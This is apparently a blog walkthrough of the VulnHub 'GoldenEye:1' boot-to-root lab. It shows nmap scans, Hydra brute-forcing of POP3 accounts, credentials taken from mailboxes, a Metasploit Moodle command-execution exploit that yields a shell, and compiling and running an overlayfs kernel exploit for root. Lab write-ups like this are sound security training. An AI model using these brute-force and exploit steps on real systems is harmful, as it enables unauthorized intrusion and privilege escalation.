@@ -1,0 +1,622 @@
+
+								
+																		Hack the Golden Eye:1 (CTF Challenge)
+								
+								
+								
+								
+									
+										posted inCTF Challenges									
+									
+									
+									on July 24, 2018
+									
+									 by										
+											Raj Chandel
+										
+										
+									
+									
+									
+									
+	SHARE
+	
+	
+		
+			
+			
+			
+				(function(d, s, id)
+				{
+					var js, fjs = d.getElementsByTagName(s)[0];
+					if (d.getElementById(id)) return;
+					js = d.createElement(s); js.id = id;
+					js.src = "//connect.facebook.net/en_US/all.js#xfbml=1";
+					fjs.parentNode.insertBefore(js, fjs);
+				}(document, 'script', 'facebook-jssdk'));
+			
+			
+			
+		
+		
+		
+		
+						Tweet
+			
+			
+				!function(d, s, id)
+				{
+					var js,fjs=d.getElementsByTagName(s)[0];if(!d.getElementById(id)){js=d.createElement(s);js.id=id;js.src="//platform.twitter.com/widgets.js";fjs.parentNode.insertBefore(js,fjs);}
+				}(document, "script", "twitter-wjs");
+			
+		
+		
+		
+		
+			
+			
+			
+			
+			
+			  (function()
+			  {
+				var po = document.createElement('script'); po.type = 'text/javascript'; po.async = true;
+				po.src = 'https://apis.google.com/js/plusone.js';
+				var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(po, s);
+			  })();
+			
+		
+		
+		
+		
+						
+			
+			
+			
+		
+		
+	
+	
+	
+									
+																	
+								
+								
+																
+								
+									Welcome to another boot2root CTF challenge “Golden Eye” uploaded by Creosote on vulnhub. As, there is a theme, and you will need to snag the flag in order to complete the challenge and you can download it from https://www.vulnhub.com/entry/goldeneye-1,240/
+ By author, it has a good variety of techniques needed to get root – no exploit development/buffer overflows. So, on the basis of our experience and knowledge, we have made progress in solving the lab.
+Level: Intermediate
+Penetrating Methodologies:
+
+Network scanning (Nmap)
+Surfing HTTP web services
+Fetched Encoded password
+Decoding (Burp suite)
+Brute-Force (Hydra)
+Connecting to pop3 (Netcat)
+Extracting password
+Adding domain Name (/etc/host)
+Exploring Domain Name over browser
+Brute-force (Hydra)
+Login to Server
+Exploiting Moodle (Metasploit)
+Kernel post Exploit (overlayfs)
+Capture the flag
+
+Let’s start
+First and foremost we’ll scan the IP address with nmap. In my case, the IP address was 192.168.1.140.
+
+		
+		
+			
+			
+			
+			
+nmap -p- -A 192.168.1.140 --open
+			
+				
+					
+				
+					1
+				
+						nmap -p- -A 192.168.1.140 --open
+					
+				
+			
+		
+
+
+Since port 80 was opened; so I explored target IP in the web browser. Here we got a little clue for login page /sev-home/ as you can see in the image.
+
+After that, we thought to check it’s the source code which leads us to another clue to move ahead. Here we clicked on the link terminal.js as shown in the image.
+
+The terminal.js put-up HTML code in front of us. Inside this html code, I read the given comment captured hint for two usernames (Boris, Natalya) and a password which was encoded as shown in the below image.
+
+We copied the above-encoded text and use burp decoder for decoding HTML encoded text into plain text and obtain “InvincibleHack3r” password.
+
+From the earlier clue of navigating to /sev-home/ to login. We browsed 192.168.1.140/sev-home/ in the browser and we got a clue that it has POP3 service as shown in the image.
+
+Earlier we had enumerated the port 55006 and 55007 which were open for unknown service thus we used nmap version scan for them and found SSL/pop3 for 55006 and pop3 for 55007 along with their version.
+
+		
+		
+			
+			
+			
+			
+nmap -Pn -p 55006,55007 -sV 192.168.1.140
+			
+				
+					
+				
+					1
+				
+						nmap -Pn -p 55006,55007 -sV 192.168.1.140
+					
+				
+			
+		
+
+
+So after getting two usernames, we applied brute-force for each users attack with help of the following command:
+
+		
+		
+			
+			
+			
+			
+hydra -l boris -P /usr/share/wordlists/fasttrack.txt -f 192.168.1.140 -s 55007 pop3
+			
+				
+					
+				
+					1
+				
+						hydra -l boris -P /usr/share/wordlists/fasttrack.txt -f 192.168.1.140 -s 55007 pop3
+					
+				
+			
+		
+
+We got the password: secret1 for username boris as shown in the image.
+
+Similarly with user natalya on port 55007 by using the command:
+
+		
+		
+			
+			
+			
+			
+hydra -l natalya -P /usr/share/wordlists/fasttrack.txt -f 192.168.1.140 -s 55007 pop3
+			
+				
+					
+				
+					1
+				
+						hydra -l natalya -P /usr/share/wordlists/fasttrack.txt -f 192.168.1.140 -s 55007 pop3
+					
+				
+			
+		
+
+We got the password: bird for username natalya as shown in the image.
+
+Using Netcat command we have logged in with the username: boris and password: secret1! .This gave us three messages as shown in the image.
+
+Now reading all of the three messages, the clues given in the messages were of no use and are just made to confuse you, as it has wasted our time to make a clue out of it.
+
+Similarly using Netcat command we have logged in with the username: natalya and password: bird. This gave us two messages as shown in the image.
+
+		
+		
+			
+			
+			
+			
+nc 192.168.1.140 55007
+			
+				
+					
+				
+					1
+				
+						nc 192.168.1.140 55007
+					
+				
+			
+		
+
+
+After opening all the messages, we saw some clues like username and password, domain name along with a directory name of the domain.
+
+		
+		
+			
+			
+			
+			
+Username: xenia
+Password: RCP90rulez!
+Domain name: /severnaya-station.com/
+Server directory: /gnocertdir
+			
+				
+					
+				
+					1234
+				
+						Username: xeniaPassword: RCP90rulez!Domain name: /severnaya-station.com/Server directory: /gnocertdir
+					
+				
+			
+		
+
+From this point, we thought of the adding the servers IP along with the domain name into Linux /etc/hosts. File.
+
+As you can see in the image we have added the domain named along with servers IP inside /etc/host file in our local machine and saved it.
+
+Next, we thought of browsing /gncertdir along with the Domain name.
+
+		
+		
+			
+			
+			
+			
+http://severnaya-station.com/gnocertdir
+			
+				
+					
+				
+					1
+				
+						http://severnaya-station.com/gnocertdir
+					
+				
+			
+		
+
+Ohhh!!!  It was GoldenEye welcome page which was designed within Moodle CMS, this can be taken as a hint for further use.
+
+Now on further exploring the tabs on the page, inside message box, we opened the recently found conversation between Xenia and Doak (another new user).
+
+Then again use hydra for fetching password for doak with help of the following command
+
+		
+		
+			
+			
+			
+			
+hydra -l doak -P /usr/share/wordlists/fasttrack.txt -f 192.168.1.140 -s 55007 pop3
+			
+				
+					
+				
+					1
+				
+						hydra -l doak -P /usr/share/wordlists/fasttrack.txt -f 192.168.1.140 -s 55007 pop3
+					
+				
+			
+		
+
+We got the password: a goat for username: doak as shown in the image.
+
+
+		
+		
+			
+			
+			
+			
+nc 192.168.1.140 55007
+			
+				
+					
+				
+					1
+				
+						nc 192.168.1.140 55007
+					
+				
+			
+		
+
+Using Netcat command we have logged in with the username: doak and password: goat. This gave us a message. Now further reading the message, we acquired a username and password.
+
+		
+		
+			
+			
+			
+			
+Username: dr_doak
+Password: 4England!
+			
+				
+					
+				
+					12
+				
+						Username: dr_doakPassword: 4England!
+					
+				
+			
+		
+
+
+Now Logging in with the acquired username: dr_doak and password: 4England! into the domains login page as shown in the image. On exploring all the tabs in the navigation section of the page, we saw an s3cret.txt file in my private files. 
+
+So we download s3cret.txt and open it with the help of cat command. It gave me the path for jpg image.
+
+		
+		
+			
+			
+			
+			
+cat s3cret.txt
+			
+				
+					
+				
+					1
+				
+						cat s3cret.txt
+					
+				
+			
+		
+
+
+We have downloaded the image file and opened it where we saw an encoded line into the base64 format, it made us curious to decode it.
+
+		
+		
+			
+			
+			
+			
+wget http://severnaya-station.com//dir007key/for-007.jpg
+string for-007.jpg
+			
+				
+					
+				
+					12
+				
+						wget http://severnaya-station.com//dir007key/for-007.jpgstring for-007.jpg
+					
+				
+			
+		
+
+
+
+		
+		
+			
+			
+			
+			
+echo {base64 encode text} | base64 -d
+			
+				
+					
+				
+					1
+				
+						echo {base64 encode text} | base64 -d
+					
+				
+			
+		
+
+And found xWinter1995x! as plain text which could be any password.
+
+Now further exploring the website we have logged into lead us to TinyMCE HTML editor inside the plugins and text editors tab. Here we have selected Google spell as a spell engine and saved the changes. But it didn’t work here, so I take help of Google.
+
+After searching for the Moodle Exploit, we found an exploit 29324, here we saw that spell engine selected for tiny MCE is PSpellShell as shown in the image. Here we have also got a clue of a new Username: admin.
+
+So now we have changed the Spell engine to PSpellShell and saved the changes made.
+
+Moodle allows an authenticated user to define spellcheck settings via the web interface. The user can update the spellcheck mechanism to point to a system-installed aspell binary. By updating the path for the spellchecker to an arbitrary command, an attacker can run arbitrary commands in the context of the web application upon spell checking requests. This module also allows an attacker to leverage another privilege escalation vulnerability.
+
+		
+		
+			
+			
+			
+			
+use exploit/multi/http/moodle_cmd_exec
+msf exploit(moodle_cmd_exec) &gt; set rhost severnaya-station.com
+msf exploit(moodle_cmd_exec) &gt; set targeturi /gnocertdir
+msf exploit(moodle_cmd_exec) &gt; set username admin
+msf exploit(moodle_cmd_exec) &gt; set password xWinter1995x!
+			
+				
+					
+				
+					12345
+				
+						use exploit/multi/http/moodle_cmd_execmsf exploit(moodle_cmd_exec) &gt; set rhost severnaya-station.commsf exploit(moodle_cmd_exec) &gt; set targeturi /gnocertdirmsf exploit(moodle_cmd_exec) &gt; set username adminmsf exploit(moodle_cmd_exec) &gt; set password xWinter1995x!
+					
+				
+			
+		
+
+Booom!!! We successfully got command shell session 1.
+
+As we love meterpreter session, so I upgrade it into the meterpreter shell.
+
+		
+		
+			
+			
+			
+			
+session -u 1
+			
+				
+					
+				
+					1
+				
+						session -u 1
+					
+				
+			
+		
+
+Then with help of sysinfo, we enumerate its kernel, here we focused on Linux version which is 3.13 and if you will search in Google then you find post exploit for  Linux Kernel 3.13.0 &lt; 3.19 (Ubuntu 12.04/14.04/14.10/15.04) – ‘overlayfs‘ Local Privilege Escalation
+
+So we search kernel exploit for Linux 3.13 and found exploit 37292 inside Kali.
+
+		
+		
+			
+			
+			
+			
+searchsploit Linux 3.13
+			
+				
+					
+				
+					1
+				
+						searchsploit Linux 3.13
+					
+				
+			
+		
+
+ Then with help of gcc, we compile it as shell inside /root directory.
+
+Then upload the compiled shell file into victim’s machine via meterpreter. Then use python one-liner to access the proper terminal and run following command.
+
+		
+		
+			
+			
+			
+			
+python –c 'import pty;pty.spawn("/bin/bash")'
+chmod 777 shell
+./shell
+			
+				
+					
+				
+					123
+				
+						python –c 'import pty;pty.spawn("/bin/bash")'chmod 777 shell./shell
+					
+				
+			
+		
+
+Unfortunately!! Got error gcc not found.
+ 
+We saw a message after accessing it that gcc is not currently installed. So to solve this issue we thought some alternative program to gcc and found cc as an alternative of it.
+By making changes into the original file: 37292.c, we replace gcc to cc as shown in the image.
+
+We have successfully compiled the exploit using cc command:
+
+		
+		
+			
+			
+			
+			
+cc 37292.c -o raj
+			
+				
+					
+				
+					1
+				
+						cc 37292.c -o raj
+					
+				
+			
+		
+
+Now by uploading the shell into the root directory. By giving all the permissions and we have easily access it without any error message.
+
+		
+		
+			
+			
+			
+			
+upload /root/raj
+chmod 777 raj
+./raj
+			
+				
+					
+				
+					123
+				
+						upload /root/rajchmod 777 raj./raj
+					
+				
+			
+		
+
+Yuppie!! We got root access successfully!!
+
+Now let’s finish this task by capturing flag.txt inside /root directory.
+
+		
+		
+			
+			
+			
+			
+cd /root
+ls -ls
+cat .flag.txt
+			
+				
+					
+				
+					123
+				
+						cd /rootls -lscat .flag.txt
+					
+				
+			
+		
+
+
+Author: Ashray Gupta is a Researcher and Technical Writer at Hacking Articles. He is a certified ethical hacker, web penetration tester and a researcher in nanotechnology. Contact Here
+Share this:Click to share on Twitter (Opens in new window)Click to share on Facebook (Opens in new window)Like this:Like Loading...									
+																	
+								
+								
+															
+							
+								Masoud October 3, 2018 at 5:28 pm							
+							
+							
+														
+							
+								How can I find the IP address of my VM ? I was able to install it on the VMWare workstation and my network is 192.168.20.0/24
+Do you think once I install this VM I willk be assign a IP in the range of 192.168.20.0 network or may be I will get either 192.168.1.140  or something else.
+How will I know I am scanning the correct IP?
+Thanks
+								
+															
+							
+							
+							
+								Reply ↓							
+							
+						
